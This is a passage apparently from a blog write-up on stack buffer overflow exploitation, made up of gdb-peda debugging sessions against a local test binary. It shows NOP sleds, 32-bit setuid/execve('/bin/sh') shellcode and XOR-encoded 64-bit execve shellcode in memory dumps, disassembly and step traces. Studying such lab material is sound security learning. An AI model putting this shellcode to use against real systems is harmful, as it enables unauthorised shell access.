0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0xffffd030<br>0xffffd070:     0x00000000      0xffffd114      0xffffd120      0xffffd0a4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0xffffd04c,0xffffd06c</span><br>Dump of assembler code from 0xffffd04c to 0xffffd06c:<br>   0xffffd04c:  xor    eax,eax<br>   0xffffd04e:  mov    ebx,eax<br>   0xffffd050:  mov    al,0x17<br>   0xffffd052:  int    0x80<br>   0xffffd054:  xor    edx,edx<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>   0xffffd05c:  push   0x69622f2f<br>   0xffffd061:  mov    ebx,esp<br>   0xffffd063:  push   edx<br>   0xffffd064:  push   ebx<br>   0xffffd065:  mov    ecx,esp<br>   0xffffd067:  lea    eax,[edx+0xb]<br>   0xffffd06a:  int    0x80<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>EBP: 0x80cd0b42 <br>ESP: 0xffffd068 (&quot;n/sh&quot;)<br>EIP: 0xffffd05c (&quot;h//bi\211\343RS\211\341\215n/sh&quot;)<br>EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0xffffd054:  xor    edx,edx<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>=&gt; 0xffffd05c:  push   0x69622f2f<br>   0xffffd061:  mov    ebx,esp<br>   0xffffd063:  push   edx<br>   0xffffd064:  push   ebx<br>   0xffffd065:  mov    ecx,esp<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>EBP: 0x80cd0b42 <br>ESP: 0xffffd064 (&quot;//bin/sh&quot;)<br>EIP: 0xffffd061 --&gt; 0x2f52e389<br>EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>   0xffffd05c:  push   0x69622f2f<br>=&gt; 0xffffd061:  mov    ebx,esp<br>   0xffffd063:  push   edx<br>   0xffffd064:  das    <br>   0xffffd065:  das    <br>   0xffffd066:  bound  ebp,QWORD PTR [ecx+0x6e]<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0xffffd04c,0xffffd06c</span><br>Dump of assembler code from 0xffffd04c to 0xffffd06c:<br>   0xffffd04c:  xor    eax,eax<br>   0xffffd04e:  mov    ebx,eax<br>   0xffffd050:  mov    al,0x17<br>   0xffffd052:  int    0x80<br>   0xffffd054:  xor    edx,edx<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>   0xffffd05c:  push   0x622f2f<br>   0xffffd061:  add    BYTE PTR [eax],al<br>   0xffffd063:  add    BYTE PTR [edi],ch<br>   0xffffd065:  das    <br>=&gt; 0xffffd066:  bound  ebp,QWORD PTR [ecx+0x6e]<br>   0xffffd069:  das    <br>   0xffffd06a:  jae    0xffffd0d4<br>End of assembler dump.<br></code></pre></td></tr></table></figure>
<h4 id="64-bit-program"><a href="#64-bit-program" class="headerlink" title="64 bit program"></a>64 bit program</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde20: 0x00007fffffffdf98      0x0000000200000000<br>0x7fffffffde30: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde40: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde50: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde60: 0x9090909090909090      0xfde98148c9314890<br>0x7fffffffde70: 0xffef058d48ffffff      0x27244955bb48ffff<br>0x7fffffffde80: 0x27583148a6c74762      0xf4e2fffffff82d48<br>0x7fffffffde90: 0xd5e8290b450bf11d      0xf895183677bd493d<br>0x7fffffffdea0: 0xa6c74767287c723f      0x00007fffffffde30<br>0x7fffffffdeb0: 0x00007fffffffdf98      0x00000002f7fca000<br>0x7fffffffdec0: 0x0000000000401136      0x00007fffffffe2c9<br>0x7fffffffded0: 0x0000000000401180      0xf09b2a5a4e6f7545<br>0x7fffffffdee0: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf00: 0x0f64d5a5f30f7545      0x0f64c5e581037545<br>0x7fffffffdf10: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf20: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdf30: 0x00007fffffffdf98      0x00007fffffffdfb0<br>0x7fffffffdf40: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdf50: 0x0000000000000000      0x0000000000401050<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde68,0x7fffffffdea8</span><br>Dump of assembler code from 0x7fffffffde68 to 0x7fffffffdea8:<br>   0x00007fffffffde68:  nop<br>   0x00007fffffffde69:  xor    rcx,rcx<br>   0x00007fffffffde6c:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde73:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde69<br>   0x00007fffffffde7a:  movabs rbx,0xa6c7476227244955<br>   0x00007fffffffde84:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde88:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde8e:  loop   0x7fffffffde84<br>   0x00007fffffffde90:  sbb    eax,0xb450bf1<br>   0x00007fffffffde95:  sub    eax,ebp<br>   0x00007fffffffde97:  (bad)  <br>   0x00007fffffffde98:  cmp    eax,0x3677bd49<br>   0x00007fffffffde9d:  sbb    BYTE PTR [rbp+0x7c723ff8],dl<br>   0x00007fffffffdea3:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffdea6:  (bad)  <br>   0x00007fffffffdea7:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RBP: 0xa6c74767287c723f <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde90 --&gt; 0x732f6e69622fb848 <br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde84:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde88:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde8e:      loop   0x7fffffffde84<br>=&gt; 0x7fffffffde90:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde9a:      cdq    <br>   0x7fffffffde9b:      push   rax<br>   0x7fffffffde9c:      push   rsp<br>   0x7fffffffde9d:      pop    rdi<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde68,0x7fffffffdea8</span><br>Dump of assembler code from 0x7fffffffde68 to 0x7fffffffdea8:<br>   0x00007fffffffde68:  nop<br>   0x00007fffffffde69:  xor    rcx,rcx<br>   0x00007fffffffde6c:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde73:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde69<br>   0x00007fffffffde7a:  movabs rbx,0xa6c7476227244955<br>   0x00007fffffffde84:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde88:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde8e:  loop   0x7fffffffde84<br>=&gt; 0x00007fffffffde90:  movabs rax,0x68732f6e69622f<br>   0x00007fffffffde9a:  cdq    <br>   0x00007fffffffde9b:  push   rax<br>   0x00007fffffffde9c:  push   rsp<br>   0x00007fffffffde9d:  pop    rdi<br>   0x00007fffffffde9e:  push   rdx<br>   0x00007fffffffde9f:  pop    rsi<br>   0x00007fffffffdea0:  push   0x3b<br>   0x00007fffffffdea2:  pop    rax<br>   0x00007fffffffdea3:  syscall <br>   0x00007fffffffdea5:  add    BYTE PTR [rax],al<br>   0x00007fffffffdea7:  add    BYTE PTR [rax],dh<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>Warning:<br>Cannot insert breakpoint 0.<br>Cannot access memory at address 0x68732f6e69622f<br><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RBP: 0xa6c74767287c723f <br>RSP: 0x7fffffffdea8 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RIP: 0x7fffffffde9c --&gt; 0xf583b6a5e525f54 <br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde90:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde9a:      cdq    <br>   0x7fffffffde9b:      push   rax<br>=&gt; 0x7fffffffde9c:      push   rsp<br>   0x7fffffffde9d:      pop    rdi<br>   0x7fffffffde9e:      push   rdx<br>   0x7fffffffde9f:      pop    rsi<br>   0x7fffffffdea0:      push   0x3b<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>RAX: 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RBX: 0xa6c7476227244955 <br>RCX: 0x0 <br>RDX: 0x0 <br>RSI: 0x0 <br>RDI: 0x7fffffffdea8 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RBP: 0xa6c74767287c723f <br>RSP: 0x7fffffffdea8 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RIP: 0x7fffffffdea0 --&gt; 0x0 <br>EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde9d:      pop    rdi<br>   0x7fffffffde9e:      push   rdx<br>   0x7fffffffde9f:      pop    rsi<br>=&gt; 0x7fffffffdea0:      add    BYTE PTR [rax],al<br>   0x7fffffffdea2:      add    BYTE PTR [rax],al<br>   0x7fffffffdea4:      add    BYTE PTR [rax],al<br>   0x7fffffffdea6:      add    BYTE PTR [rax],al<br>   0x7fffffffdea8:      (bad)<br></code></pre></td></tr></table></figure>
<p>Ê≠£Â∏∏Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>=&gt; 0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>   0x00007fffffffde57:  sbb    eax,0xb450bf1<br>   0x00007fffffffde5c:  sub    eax,ebp<br>   0x00007fffffffde5e:  (bad)  <br>   0x00007fffffffde5f:  cmp    eax,0x3677bd49<br>   0x00007fffffffde64:  sbb    BYTE PTR [rbp+0x7c723ff8],dl<br>   0x00007fffffffde6a:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffde6d:  (bad)  <br>   0x00007fffffffde6e:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>   0x00007fffffffde6f:  nop<br>End of assembler dump.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde30 --&gt; 0xfffde98148c93148 <br>RBX: 0xa6c7476227244955 <br>RCX: 0x3 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4f --&gt; 0xf4e2fffffff82d48 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>=&gt; 0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x493d732f6e69622f<br>   0x7fffffffde61:      mov    ebp,0x95183677<br>   0x7fffffffde66:      clc<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4f in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde38 --&gt; 0xffffef058d48ffff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x3 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde55 --&gt; 0x6e69622fb848f4e2 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>=&gt; 0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x493d732f6e69622f<br>   0x7fffffffde61:      mov    ebp,0x95183677<br>   0x7fffffffde66:      clc    <br>   0x7fffffffde67:      (bad)<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, 